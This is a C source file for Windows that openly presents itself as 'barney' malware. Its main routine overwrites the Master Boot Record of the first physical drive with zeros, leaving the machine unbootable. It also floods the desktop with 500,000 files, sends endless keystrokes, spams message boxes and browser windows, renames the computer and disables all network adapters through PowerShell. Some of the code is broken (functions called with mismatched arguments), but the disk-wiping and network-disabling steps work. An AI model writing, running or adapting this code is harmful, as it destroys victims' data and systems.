#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <process.h>

void trollies(void*);
void filebomb(void*);
void registrycorruption(void*);
void keyboardspam(void*);
void mbroverwrite(void*);
void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize);

int main()
{
    _beginthread(trollies, 0, NULL);
    _beginthread(filebomb, 0, NULL);
    _beginthread(registrycorruption, 0, NULL);
    _beginthread(keyboardspam, 0, NULL);
    mbroverwrite();
    Sleep(10000); // Wait for threads to finish, adjust time accordingly
    return 0;
}

void mbroverwrite()
{
    char mbrData[512]; // 512 bytes
    ZeroMemory(&mbrData, sizeof(mbrData));

    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(MBR, mbrData, 512, NULL, NULL);
    CloseHandle(MBR);
}

void filebomb(void *arg)
{
    char filename[200]; // Array to store filename
    const char *desktopPath = getenv("USERPROFILE"); // For Windows, use the USERPROFILE environment variable
    if (desktopPath == NULL) {
        fprintf(stderr, "Error: Unable to get the desktop path.\n");
        return 1;
    }

    strcpy(filename, desktopPath); // Copy the desktop path to the filename
    strcat(filename, "\\Desktop\\"); // Use backslashes for Windows path

    for (int i = 1; i <= 500000; i++) {
        sprintf(filename, "%sYOU GOT BARNIED%d.barney", filename, i); // Create filename with index
        FILE *file = fopen(filename, "w"); // Open file in write mode
        if (file != NULL) {
            fclose(file); // Close the file
        }
        strcpy(filename, desktopPath); // Reset filename for the next iteration
        strcat(filename, "\\Desktop\\"); // Reset the path
    }
}


void registrycorruption(void *arg)
{
    HKEY hKey;
    DWORD dwDisposition;
    LONG lResult;
    DWORD dwMyValue = 0;

    lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
                             "Software\\MyApp",
                             0,
                             NULL,
                             REG_OPTION_NON_VOLATILE,
                             KEY_ALL_ACCESS,
                             NULL,
                             &hKey,
                             &dwDisposition);

    if (lResult == ERROR_SUCCESS)
    {
        lResult = RegSetValueEx(hKey,
                                "MyValue",
                                0,
                                REG_DWORD,
                                (BYTE*)&dwMyValue,
                                sizeof(DWORD));

        RegCloseKey(hKey);
    }
}

void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize)
{
    if (bytes == NULL || key == NULL)
        return;

    if (keysize > 1)
    {
        size_t j = 0;
        for (size_t i = 0; i < arrsize; ++i)
        {
            bytes[i] = bytes[i] ^ key[j];
            j = (j + 1) % keysize;
        }
    }
    else
    {
        for (size_t i = 0; i < arrsize; ++i)
        {
            bytes[i] = bytes[i] ^ key[0];
        }
    }
}

void keyboardspam(void *arg)
{
    const char *text = "barney";
    INPUT inputs[6 * 2] = {0}; // Each character and its release

    for (int i = 0; i < 6; i++) {
        inputs[i * 2].type = inputs[i * 2 + 1].type = INPUT_KEYBOARD;
        inputs[i * 2].ki.wVk = inputs[i * 2 + 1].ki.wVk = toupper(text[i]);
        inputs[i * 2 + 1].ki.dwFlags = KEYEVENTF_KEYUP;
    }

    while (1) {
        // Send the input events
        SendInput(12, inputs, sizeof(INPUT));
    }
}

void trollies(void *arg)
{

    printf("\x1b[35m"); // Set text color to purple
    printf("__________    _____ __________  _______  ________________.___.\n"
           "\\______   \\  /  _  \\\\______   \\ \\      \\ \\_   _____/\\__  |   |\n"
           " |    |  _/ /  /_\\  \\|       _/ /   |   \\ |    __)_  /   |   |\n"
           " |    |   \\/    |    \\    |   \\/    |    \\|        \\ \\____   |\n"
           " |______  /\\____|__  /____|_  /\\____|__  /_______  / / ______|\n"
           "        \\/         \\/       \\/         \\/        \\/  \\/       \n");
    printf("\n");
    printf("                     Malware Author: Azrael        \n"
           "           You got infected by barney malware :D\n"
           "         Goodluck on trying to recover your computer.\n");
    printf("\x1b[0m"); // Reset text color
    printf("\n");

    //Spam error message box
    for (int i = 0; i < 10; i++)
        MessageBox(
            NULL,
            "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
            "BARNEY",
            "BARNEY",
            MB_ABORTRETRYIGNORE | MB_DEFBUTTON2 | MB_ICONERROR
        );

    // Change wallpaper
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"wallpaper.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    // Change computer name
    SetComputerNameEx(ComputerNamePhysicalNetBIOS, "Barney");

    //Opens browser
    for (int i = 0; i < 20; i++) 
    {
        system("start https://www.google.com/search?q=barney+is+looking+for+you");
    }

    // Plays barney music
    PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);

    //Disable mouse

    //Messes up computer screen

    // Corrupts registry and files
    registrycorruption();

    // Disable Internet Connection
    system("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"");

    // Encrypts files
    unsigned char key[] = {0x00, 0xFF, 0x01, 0x0F};
    size_t keysize = sizeof(key);
    char text[] = "barneybarneymalware";
    crypter((unsigned char*)text, strlen(text), key, keysize); 
}
